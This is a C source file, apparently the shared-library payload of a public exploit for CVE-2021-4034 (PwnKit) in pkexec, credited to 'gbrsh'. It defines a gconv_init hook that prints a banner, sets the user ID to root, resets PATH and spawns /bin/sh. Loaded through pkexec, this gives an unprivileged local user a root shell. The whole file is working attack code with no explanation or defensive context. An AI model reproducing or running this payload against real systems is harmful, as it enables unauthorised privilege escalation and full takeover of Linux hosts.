#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void gconv() {}

void gconv_init() {

  printf("\n");
  printf("\t\t\t    ---[ CVE-2021-4034 ]---\n");
  printf("\t\t\t      (memory corruption)\n");
  printf("\t\t\t	    by gbrsh\n");
  printf("\n\n");

  setuid(0);

  putenv("PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin");
  system("/bin/sh");
  exit(0);
}
